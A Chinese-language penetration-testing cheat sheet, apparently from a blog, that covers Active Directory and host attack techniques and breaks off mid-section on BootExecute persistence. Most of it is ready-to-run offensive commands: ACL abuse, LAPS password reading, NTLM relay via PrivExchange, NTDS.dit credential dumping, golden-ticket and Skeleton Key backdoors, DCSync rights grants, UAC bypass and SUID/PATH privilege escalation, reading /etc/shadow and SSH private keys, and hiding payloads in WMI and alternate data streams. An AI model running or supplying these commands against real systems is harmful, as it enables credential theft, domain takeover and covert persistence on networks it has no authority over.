<h2 id="8-AD域ACL攻击-aclpwn-py"><a href="#8-AD域ACL攻击-aclpwn-py" class="headerlink" title="8.AD域ACL攻击(aclpwn.py)"></a>8.AD域ACL攻击(aclpwn.py)</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GenericAll on User</span><br><span class="line">GenericAll on Group</span><br><span class="line">GenericAll / GenericWrite / Write on Computer</span><br><span class="line">WriteProperty on Group</span><br><span class="line">Self (Self-Membership) on Group</span><br><span class="line">WriteProperty (Self-Membership)</span><br><span class="line">ForceChangePassword</span><br><span class="line">WriteOwner on Group</span><br><span class="line">GenericWrite on User</span><br><span class="line">WriteDACL + WriteOwner</span><br></pre></td></tr></table></figure>



<h2 id="9-获取LAPS管理员密码"><a href="#9-获取LAPS管理员密码" class="headerlink" title="9.获取LAPS管理员密码"></a>9.获取LAPS管理员密码</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-LAPSPasswords -DomainController &lt;ip_dc&gt; -Credential &lt;domain&gt;\&lt;login&gt; | Format-Table -AutoSize</span><br><span class="line"></span><br><span class="line">foreach ($objResult in $colResults)&#123;$objComputer = $objResult.Properties; $objComputer.name|where &#123;$objcomputer.name -ne $env:computername&#125;|%&#123;foreach-object &#123;Get-AdmPwdPassword -ComputerName $_&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="10-privexchange漏洞"><a href="#10-privexchange漏洞" class="headerlink" title="10.privexchange漏洞"></a>10.privexchange漏洞</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python privexchange.py -ah &lt;attacker_host_or_ip&gt; &lt;exchange_host&gt; -u &lt;user&gt; -d &lt;domain&gt; -p &lt;password&gt;</span><br><span class="line"></span><br><span class="line">ntlmrelayx.py -t ldap://&lt;dc_fqdn&gt;--escalate-user &lt;user&gt;</span><br></pre></td></tr></table></figure>

<h5 id="Exchange的利用"><a href="#Exchange的利用" class="headerlink" title="Exchange的利用"></a>Exchange的利用</h5><ul>
<li><a href="https://github.com/Ridter/Exchange2domain"><strong>Exchange2domain</strong></a></li>
<li><a href="https://github.com/WyAtu/CVE-2018-8581/"><strong>CVE-2018-8581</strong></a></li>
<li><a href="https://github.com/Ridter/CVE-2019-1040"><strong>CVE-2019-1040</strong></a></li>
<li><a href="https://github.com/Ridter/CVE-2020-0688"><strong>CVE-2020-0688</strong></a></li>
<li><a href="https://github.com/Arno0x/NtlmRelayToEWS"><strong>NtlmRelayToEWS</strong></a></li>
<li><a href="https://github.com/3gstudent/ewsManage"><strong>ewsManage</strong></a></li>
<li><a href="https://github.com/h4x0r-dz/CVE-2021-26855"><strong>CVE-2021-26855</strong></a></li>
<li><a href="https://gist.github.com/testanull/9ebbd6830f7a501e35e67f2fcaa57bda"><strong>CVE-2021-28482</strong></a></li>
</ul>
<h2 id="11-IPC"><a href="#11-IPC" class="headerlink" title="11.IPC"></a>11.IPC</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net use \\ip\ipc$ &quot;password&quot; /user:&quot;administrator&quot;</span><br><span class="line">net use \\ip\c$ &quot;password&quot; /user:&quot;administrator&quot;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>





<h2 id="12-其他横移"><a href="#12-其他横移" class="headerlink" title="12.其他横移"></a>12.其他横移</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.向WSUS服务器数据库注入恶意程序更新		WSUSpendu.ps1 # 需要先拿下 WSUS 更新分发服务器</span><br><span class="line"></span><br><span class="line">2.MSSQL Trusted Links			use exploit/windows/mssql/mssql_linkcrawler</span><br><span class="line"></span><br><span class="line">3.GPO Delegation</span><br><span class="line"></span><br><span class="line">4.ADCS</span><br></pre></td></tr></table></figure>







<h1 id="10-权限维持"><a href="#10-权限维持" class="headerlink" title="10.权限维持"></a>10.权限维持</h1><h2 id="拿到域控权限"><a href="#拿到域控权限" class="headerlink" title="拿到域控权限"></a>拿到域控权限</h2><p>dump ntds.dit 文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crackmapexec smb 127.0.0.1 -u &lt;user&gt; -p &lt;password&gt; -d &lt;domain&gt; --ntds</span><br><span class="line"></span><br><span class="line">secretsdump.py &#x27;&lt;domain&gt;/&lt;user&gt;:&lt;pass&gt;&#x27;@&lt;ip&gt;</span><br><span class="line"></span><br><span class="line">ntdsutil &quot;ac i ntds&quot; &quot;ifm&quot; &quot;create full c:\temp&quot; q q</span><br><span class="line"></span><br><span class="line">secretsdump.py  -ntds ntds_file.dit -system SYSTEM_FILE -hashes lmhash:nthash LOCAL -outputfile ntlm-extract</span><br><span class="line"></span><br><span class="line">windows/gather/credentials/domain_hashdump</span><br></pre></td></tr></table></figure>



<h2 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">net group &quot;domain admins&quot; myuser /add /domain</span><br><span class="line"></span><br><span class="line">Golden ticket（黄金票据）</span><br><span class="line"></span><br><span class="line">Silver Ticket（白银票据）</span><br><span class="line"></span><br><span class="line">DSRM 后门：</span><br><span class="line">PowerShell New-ItemProperty “HKLM:\System\CurrentControlSet\Control\Lsa\” -Name “DsrmAdminLogonBehavior” -Value 2 -PropertyType DWORD</span><br><span class="line"></span><br><span class="line">Skeleton Key：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::skeleton&quot; &quot;exit&quot;</span><br><span class="line"></span><br><span class="line">自定义 SSP DLL：</span><br><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::memssp&quot; &quot;exit&quot;</span><br><span class="line">C:\Windows\System32\kiwissp.log</span><br></pre></td></tr></table></figure>



<h2 id="域信任关系"><a href="#域信任关系" class="headerlink" title="域信任关系"></a>域信任关系</h2><h3 id="子域攻击父域-SID-History版跨域黄金票据"><a href="#子域攻击父域-SID-History版跨域黄金票据" class="headerlink" title="子域攻击父域 - SID History版跨域黄金票据"></a>子域攻击父域 - SID History版跨域黄金票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Get-NetGroup -Domain &lt;domain&gt; -GroupName &quot;Enterprise Admins&quot; -FullData|select objectsid</span><br><span class="line"></span><br><span class="line">mimikatz lsadump::trust</span><br><span class="line"></span><br><span class="line">kerberos::golden /user:Administrator /krbtgt:&lt;HASH_KRBTGT&gt; /domain:&lt;domain&gt; /sid:&lt;user_sid&gt; /sids:&lt;RootDomainSID-519&gt; /ptt</span><br></pre></td></tr></table></figure>

<h3 id="利用域信任密钥获取目标域的权限-信任票据"><a href="#利用域信任密钥获取目标域的权限-信任票据" class="headerlink" title="利用域信任密钥获取目标域的权限 - 信任票据"></a>利用域信任密钥获取目标域的权限 - 信任票据</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;lsadump::trust /patch&quot;</span><br><span class="line">&quot;lsadump::lsa /patch&quot;</span><br><span class="line"></span><br><span class="line">&quot;kerberos::golden /user:Administrator /domain:&lt;domain&gt; /sid:  </span><br><span class="line">&lt;domain_SID&gt; /rc4:&lt;trust_key&gt; /service:krbtgt /target:&lt;target_domain&gt; /ticket:</span><br><span class="line">&lt;golden_ticket_path&gt;&quot;</span><br></pre></td></tr></table></figure>



<h3 id="攻击其它林"><a href="#攻击其它林" class="headerlink" title="攻击其它林"></a>攻击其它林</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用ptintbug或petipotam漏洞使其它林的DC主动连接到本林的一台无约束委派主机，同时抓取发送过来的TGT，然后即可将它用于dcsync攻击</span><br></pre></td></tr></table></figure>



<h2 id="活动目录持久性技巧"><a href="#活动目录持久性技巧" class="headerlink" title="活动目录持久性技巧"></a>活动目录持久性技巧</h2><p><a href="https://adsecurity.org/?p=1929">https://adsecurity.org/?p=1929</a> DS恢复模式密码维护 DSRM密码同步</p>
<blockquote>
<p>Windows Server 2008 需要安装KB961320补丁才支持DSRM密码同步，Windows Server 2003不支持DSRM密码同步。KB961320:<a href="https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,%E5%8F%AF%E5%8F%82%E8%80%83%EF%BC%9A[%E5%B7%A7%E7%94%A8DSRM%E5%AF%86%E7%A0%81%E5%90%8C%E6%AD%A5%E5%B0%86%E5%9F%9F%E6%8E%A7%E6%9D%83%E9%99%90%E6%8C%81%E4%B9%85%E5%8C%96](http://drops.xmd5.com/static/drops/tips-9297.html)">https://support.microsoft.com/en-us/help/961320/a-feature-is-available-for-windows-server-2008-that-lets-you-synchroni,可参考：[巧用DSRM密码同步将域控权限持久化](http://drops.xmd5.com/static/drops/tips-9297.html)</a></p>
</blockquote>
<p><a href="https://www.dcshadow.com/">DCshadow</a></p>
<h5 id="Security-Support-Provider"><a href="#Security-Support-Provider" class="headerlink" title="Security Support Provider"></a>Security Support Provider</h5><p>简单的理解为SSP就是一个DLL，用来实现身份认证</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">misc::memssp</span><br></pre></td></tr></table></figure>

<p>这样就不需要重启<code>c:/windows/system32</code>可看到新生成的文件kiwissp.log</p>
<h5 id="SID-History"><a href="#SID-History" class="headerlink" title="SID History"></a><a href="https://adsecurity.org/?p=1772">SID History</a></h5><p>SID历史记录允许另一个帐户的访问被有效地克隆到另一个帐户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;privilege::debug&quot; &quot;misc::addsid bobafett ADSAdministrator&quot;</span><br></pre></td></tr></table></figure>

<h5 id="AdminSDHolder＆SDProp"><a href="#AdminSDHolder＆SDProp" class="headerlink" title="AdminSDHolder＆SDProp"></a><a href="https://adsecurity.org/?p=1906">AdminSDHolder＆SDProp</a></h5><p>利用AdminSDHolder＆SDProp（重新）获取域管理权限</p>
<h5 id="Dcsync后门"><a href="#Dcsync后门" class="headerlink" title="Dcsync后门"></a>Dcsync后门</h5><p>向域成员赋予Dcsync权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Powerview.ps1</span><br><span class="line">Add-DomainObjectAcl -TargetIdentity &quot;DC=vulntarget,DC=com&quot; -PrincipalIdentity test1 -Rights DCSync -Verbose</span><br></pre></td></tr></table></figure>

<p>在登录了test1域账户的机器上执行Dcsync利用操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz &quot;lsadump::dcsync /domain:vulntarget.com /all /csv&quot;</span><br></pre></td></tr></table></figure>



<h5 id="组策略"><a href="#组策略" class="headerlink" title="组策略"></a>组策略</h5><p><a href="https://adsecurity.org/?p=2716">https://adsecurity.org/?p=2716</a> <a href="https://www.anquanke.com/post/id/86531">策略对象在持久化及横向渗透中的应用</a></p>
<h5 id="Hook-PasswordChangeNotify"><a href="#Hook-PasswordChangeNotify" class="headerlink" title="Hook PasswordChangeNotify"></a>Hook PasswordChangeNotify</h5><p><a href="http://www.vuln.cn/6812">http://www.vuln.cn/6812</a></p>
<h5 id="Kerberoasting后门"><a href="#Kerberoasting后门" class="headerlink" title="Kerberoasting后门"></a>Kerberoasting后门</h5><p><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting">域渗透-Kerberoasting</a></p>
<h5 id="AdminSDHolder"><a href="#AdminSDHolder" class="headerlink" title="AdminSDHolder"></a>AdminSDHolder</h5><p><a href="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence">Backdooring AdminSDHolder for Persistence</a></p>
<h5 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h5><p><a href="https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#unconstrained-domain-persistence">Unconstrained Domain Persistence</a></p>
<p>证书伪造： <a href="https://github.com/Ridter/pyForgeCert">pyForgeCert</a></p>
<h1 id="11-敏感文件"><a href="#11-敏感文件" class="headerlink" title="11.敏感文件"></a>11.敏感文件</h1><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">C:\boot.ini     <span class="comment">//查看系统版本</span></span><br><span class="line"><span class="attr">C</span>:\Windows\System32\inetsrv\MetaBase.xml    <span class="comment">//IIS配置文件</span></span><br><span class="line"><span class="attr">C</span>:\Windows\repair\sam     <span class="comment">//存储系统初次安装的密码</span></span><br><span class="line"><span class="attr">C</span>:\Program Files\mysql\my.ini     <span class="comment">//Mysql配置</span></span><br><span class="line"><span class="attr">C</span>:\Program Files\mysql\data\mysql\user.MYD    <span class="comment">//Mysql root</span></span><br><span class="line"><span class="attr">C</span>:\Windows\php.ini    <span class="comment">//php配置信息</span></span><br><span class="line"><span class="attr">C</span>:\Windows\my.ini     <span class="comment">//Mysql配置信息</span></span><br><span class="line"><span class="attr">C</span>:\Windows\win.ini    <span class="comment">//Windows系统的一个基本系统配置文件</span></span><br></pre></td></tr></table></figure>

<h2 id="Linux-1"><a href="#Linux-1" class="headerlink" title="Linux"></a>Linux</h2><p>敏感配置文件</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">#判断是否在docker容器内</span><br><span class="line">/proc/<span class="number">1</span>/cgroup</span><br><span class="line"></span><br><span class="line"># 系统版本</span><br><span class="line">cat /etc/issue</span><br><span class="line"></span><br><span class="line"># 内核版本</span><br><span class="line">cat /proc/version</span><br><span class="line"></span><br><span class="line"># 账户密码</span><br><span class="line">cat /etc/passwd</span><br><span class="line">cat /etc/shadow</span><br><span class="line"></span><br><span class="line"># 环境变量</span><br><span class="line">cat /etc/profile</span><br><span class="line"></span><br><span class="line"># 系统应用(命令)</span><br><span class="line">ls -lah/sbin</span><br><span class="line"></span><br><span class="line"># 安装应用(命令)</span><br><span class="line">la -lah /usr/bin</span><br><span class="line"></span><br><span class="line"># 开机自启</span><br><span class="line">cat /etc/crontab</span><br><span class="line"></span><br><span class="line"># history</span><br><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br><span class="line"></span><br><span class="line"># 网络配置</span><br><span class="line">cat /etc/resolv.conf</span><br><span class="line">cat /etc/networks</span><br><span class="line">cat /etc/network/interfaces</span><br><span class="line">cat /etc/sysconfig/network</span><br><span class="line">cat /etc/host.conf</span><br><span class="line">cat /etc/hosts</span><br><span class="line">cat /etc/dhcpd.conf</span><br><span class="line"></span><br><span class="line"># Service配置</span><br><span class="line">cat /etc/apache2/apache2.conf</span><br><span class="line">cat /etc/httpd/conf/httpd.conf</span><br><span class="line">cat /etc/httpd/conf/httpd2.conf</span><br><span class="line">cat /<span class="keyword">var</span>/apache2/config.inc</span><br><span class="line">cat /usr/local/etc/nginx/nginx.conf</span><br><span class="line">cat /usr/local/nginx/conf/nginx.conf</span><br><span class="line">cat /etc/my.cnf</span><br><span class="line">cat /etc/mysql/my.cnf</span><br><span class="line">cat /<span class="keyword">var</span>/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /etc/mongod.conf</span><br><span class="line">cat /usr/local/redis/redis.conf</span><br><span class="line">cat /etc/redis/redis.conf</span><br><span class="line"></span><br><span class="line"># ftp</span><br><span class="line">cat /etc/proftpd.conf</span><br><span class="line"></span><br><span class="line"># mail</span><br><span class="line">cat /<span class="keyword">var</span>/mail/root</span><br><span class="line">cat /<span class="keyword">var</span>/spool/mail/root</span><br><span class="line">cat ~/.fetchmailrc</span><br><span class="line">cat /etc/procmailrc</span><br><span class="line">cat ~/.procmailrc</span><br><span class="line">cat /etc/exim/exim.cf</span><br><span class="line">cat /etc/postfix/main.cf</span><br><span class="line">cat /etc/mail/sendmail.mc</span><br><span class="line">cat /usr/share/sendmail/cf/cf/linux.smtp.mc</span><br><span class="line">cat /etc/mail/sendmail.cf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># ssh</span><br><span class="line">cat ~<span class="regexp">/.ssh/</span>authorized_keys</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>dentity</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_rsa</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa.pub</span><br><span class="line">cat ~<span class="regexp">/.ssh/i</span>d_dsa</span><br><span class="line">cat /etc/ssh/ssh_config</span><br><span class="line">cat /etc/ssh/sshd_config</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_dsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_rsa_key</span><br><span class="line">cat /etc/ssh/ssh_host_key.pub</span><br><span class="line">cat /etc/ssh/ssh_host_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># log</span><br><span class="line">ls /<span class="keyword">var</span>/log</span><br><span class="line">cat /etc/httpd/logs/access_log</span><br><span class="line">cat /etc/httpd/logs/access.log</span><br><span class="line">cat /etc/httpd/logs/error_log</span><br><span class="line">cat /etc/httpd/logs/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache2/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/apache/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/auth.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/chttp.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/cups/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/dpkg.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/faillog</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error_log</span><br><span class="line">cat /<span class="keyword">var</span>/log/httpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lastlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.access.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/lighttpd/lighttpd.error.log</span><br><span class="line">cat /<span class="keyword">var</span>/log/messages</span><br><span class="line">cat /<span class="keyword">var</span>/log/secure</span><br><span class="line">cat /<span class="keyword">var</span>/log/syslog</span><br><span class="line">cat /<span class="keyword">var</span>/log/wtmp</span><br><span class="line">cat /<span class="keyword">var</span>/log/xferlog</span><br><span class="line">cat /<span class="keyword">var</span>/log/yum.log</span><br><span class="line">cat /<span class="keyword">var</span>/run/utmp</span><br><span class="line">cat /<span class="keyword">var</span>/webmin/miniserv.log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access_log</span><br><span class="line">cat /<span class="keyword">var</span>/www/logs/access.log</span><br><span class="line"></span><br><span class="line"># proc fuzz</span><br><span class="line">/proc/self/fd/<span class="number">32</span></span><br><span class="line">/proc/self/fd/<span class="number">33</span></span><br><span class="line">/proc/self/fd/<span class="number">34</span></span><br><span class="line">/proc/self/fd/<span class="number">35</span></span><br><span class="line">/proc/sched_debug</span><br><span class="line">/proc/mounts</span><br><span class="line">/proc/net/arp</span><br><span class="line">/proc/net/route</span><br><span class="line">/proc/net/tcp</span><br><span class="line">/proc/net/udp</span><br><span class="line">/proc/net/fib_trie</span><br><span class="line">/proc/version</span><br></pre></td></tr></table></figure>





<h1 id="12-权限提升"><a href="#12-权限提升" class="headerlink" title="12.权限提升"></a>12.权限提升</h1><h2 id="Windows-1"><a href="#Windows-1" class="headerlink" title="Windows"></a>Windows</h2><h3 id="bypass-UAC"><a href="#bypass-UAC" class="headerlink" title="bypass UAC"></a>bypass UAC</h3><h5 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h5><ul>
<li>使用IFileOperation COM接口</li>
<li>使用Wusa.exe的extract选项</li>
<li>远程注入SHELLCODE 到傀儡进程</li>
<li>DLL劫持，劫持系统的DLL文件</li>
<li>eventvwr.exe and registry hijacking</li>
<li>sdclt.exe</li>
<li>SilentCleanup</li>
<li>wscript.exe</li>
<li>cmstp.exe</li>
<li>修改环境变量，劫持高权限.Net程序</li>
<li>修改注册表HKCU\Software\Classes\CLSID，劫持高权限程序</li>
<li>直接提权过UAC</li>
<li>……</li>
</ul>
<h5 id="常用工具"><a href="#常用工具" class="headerlink" title="常用工具"></a>常用工具</h5><ul>
<li><a href="https://github.com/hfiref0x/UACME">UACME</a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC">Bypass-UAC</a></li>
<li><a href="https://github.com/FuzzySecurity/PowerShell-Suite/tree/master/Bypass-UAC/Yamabiko">Yamabiko</a></li>
<li>…</li>
</ul>
<h4 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h4><ul>
<li>windows内核漏洞提权</li>
</ul>
<blockquote>
<p>检测类:<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">Windows-Exploit-Suggester</a>,<a href="https://github.com/brianwrf/WinSystemHelper">WinSystemHelper</a>,<a href="https://github.com/bitsadmin/wesng">wesng</a></p>
</blockquote>
<blockquote>
<p>利用类:<a href="https://github.com/SecWiki/windows-kernel-exploits">windows-kernel-exploits</a>，<a href="https://github.com/AlessandroZ/BeRoot.git">BeRoot</a></p>
</blockquote>
<ul>
<li>服务提权</li>
</ul>
<blockquote>
<p>数据库服务，ftp服务等</p>
</blockquote>
<ul>
<li>WINDOWS错误系统配置</li>
<li>系统服务的错误权限配置漏洞</li>
<li>不安全的注册表权限配置</li>
<li>不安全的文件/文件夹权限配置</li>
<li>计划任务</li>
<li>任意用户以NT AUTHORITY\SYSTEM权限安装msi</li>
<li>提权脚本</li>
</ul>
<blockquote>
<p><a href="https://github.com/HarmJ0y/PowerUp/blob/master/PowerUp.ps1">PowerUP</a>,<a href="https://github.com/rsmudge/ElevateKit">ElevateKit</a></p>
</blockquote>
<h2 id="Linux-2"><a href="#Linux-2" class="headerlink" title="Linux"></a>Linux</h2><h4 id="内核溢出提权"><a href="#内核溢出提权" class="headerlink" title="内核溢出提权"></a>内核溢出提权</h4><p><a href="https://github.com/SecWiki/linux-kernel-exploits">linux-kernel-exploits</a></p>
<h4 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">crontab -l</span><br><span class="line">ls -alh /var/spool/cron</span><br><span class="line">ls -al /etc/ | grep cron</span><br><span class="line">ls -al /etc/cron*</span><br><span class="line">cat /etc/cron*</span><br><span class="line">cat /etc/at.allow</span><br><span class="line">cat /etc/at.deny</span><br><span class="line">cat /etc/cron.allow</span><br><span class="line">cat /etc/cron.deny</span><br><span class="line">cat /etc/crontab</span><br><span class="line">cat /etc/anacrontab</span><br><span class="line">cat /var/spool/cron/crontabs/root</span><br></pre></td></tr></table></figure>

<h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p>寻找可利用bin：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
<h4 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">echo “/bin/sh” &gt; ps</span><br><span class="line">chmod 777 ps</span><br><span class="line">echo $PATH</span><br><span class="line">export PATH=/tmp:$PATH</span><br><span class="line">cd /home/raj/script</span><br><span class="line">./shell</span><br><span class="line">whoami</span><br></pre></td></tr></table></figure>

<p><a href="https://xz.aliyun.com/t/2767">Linux环境变量提权 - 先知社区)</a></p>
<h4 id="系统服务的错误权限配置漏洞"><a href="#系统服务的错误权限配置漏洞" class="headerlink" title="系统服务的错误权限配置漏洞"></a>系统服务的错误权限配置漏洞</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /var/apache2/config.inc</span><br><span class="line">cat /var/lib/mysql/mysql/user.MYD</span><br><span class="line">cat /root/anaconda-ks.cfg</span><br></pre></td></tr></table></figure>

<h4 id="不安全的文件-文件夹权限配置"><a href="#不安全的文件-文件夹权限配置" class="headerlink" title="不安全的文件/文件夹权限配置"></a>不安全的文件/文件夹权限配置</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat ~/.bash_history</span><br><span class="line">cat ~/.nano_history</span><br><span class="line">cat ~/.atftp_history</span><br><span class="line">cat ~/.mysql_history</span><br><span class="line">cat ~/.php_history</span><br></pre></td></tr></table></figure>

<h4 id="找存储的明文用户名，密码"><a href="#找存储的明文用户名，密码" class="headerlink" title="找存储的明文用户名，密码"></a>找存储的明文用户名，密码</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -i user [filename]</span><br><span class="line">grep -i pass [filename]</span><br><span class="line">grep -C 5 &quot;password&quot; [filename]</span><br><span class="line">find . -name &quot;*.php&quot; -print0 | xargs -0 grep -i -n &quot;var $password&quot; # Joomla</span><br></pre></td></tr></table></figure>



<h1 id="13-权限维持"><a href="#13-权限维持" class="headerlink" title="13.权限维持"></a>13.权限维持</h1><h2 id="Windows-2"><a href="#Windows-2" class="headerlink" title="Windows"></a>Windows</h2><h5 id="1、密码记录工具"><a href="#1、密码记录工具" class="headerlink" title="1、密码记录工具"></a>1、密码记录工具</h5><p>WinlogonHack WinlogonHack 是一款用来劫取远程3389登录密码的工具，在 WinlogonHack 之前有 一个 Gina 木马主要用来截取 Windows 2000下的密码，WinlogonHack 主要用于截 取 Windows XP 以及 Windows 2003 Server。 键盘记录器 安装键盘记录的目地不光是记录本机密码，是记录管理员一切的密码，比如说信箱，WEB 网页密码等等，这样也可以得到管理员的很多信息。 NTPass 获取管理员口令,一般用 gina 方式来,但有些机器上安装了 pcanywhere 等软件，会导致远程登录的时候出现故障，本软件可实现无障碍截取口令。 Linux 下 openssh 后门 重新编译运行的sshd服务，用于记录用户的登陆密码。</p>
<h5 id="2、常用的存储Payload位置"><a href="#2、常用的存储Payload位置" class="headerlink" title="2、常用的存储Payload位置"></a>2、常用的存储Payload位置</h5><p><strong>WMI</strong> : 存储：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$StaticClass = New-Object Management.ManagementClass(&#x27;root\cimv2&#x27;, $null,$null)</span><br><span class="line">$StaticClass.Name = &#x27;Win32_Command&#x27;</span><br><span class="line">$StaticClass.Put()</span><br><span class="line">$StaticClass.Properties.Add(&#x27;Command&#x27; , $Payload)</span><br><span class="line">$StaticClass.Put() </span><br></pre></td></tr></table></figure>

<p>读取:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$Payload=([WmiClass] &#x27;Win32_Command&#x27;).Properties[&#x27;Command&#x27;].Value</span><br></pre></td></tr></table></figure>

<p><strong>包含数字签名的PE文件</strong> 利用文件hash的算法缺陷，向PE文件中隐藏Payload，同时不影响该PE文件的数字签名 <strong>特殊ADS</strong> …</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; ...:putty.exe</span><br><span class="line">wmic process call create c:\test\ads\...:putty.exe</span><br></pre></td></tr></table></figure>

<p>特殊COM文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt; \\.\C:\test\ads\COM1:putty.exe</span><br><span class="line">wmic process call create \\.\C:\test\ads\COM1:putty.exe</span><br></pre></td></tr></table></figure>

<p>磁盘根目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">type putty.exe &gt;C:\:putty.exe </span><br><span class="line">wmic process call create C:\:putty.exe</span><br></pre></td></tr></table></figure>

<h5 id="3、Run-RunOnce-Keys"><a href="#3、Run-RunOnce-Keys" class="headerlink" title="3、Run/RunOnce Keys"></a>3、Run/RunOnce Keys</h5><p>用户级</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce</span><br></pre></td></tr></table></figure>

<p>管理员</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><br><span class="line">HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span><br><span class="line">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run</span><br></pre></td></tr></table></figure>

<h5 id="4、BootExecute-Key"><a href="#4、BootExecute-Key" class="headerlink" title="4、BootExecute Key"></a>4、BootExecute Key</h5><p>由于smss.exe在Windows子系统加载之前启动，因此会调用配置子系统来加载当前的配置单元，具体注册表键值为：</p>
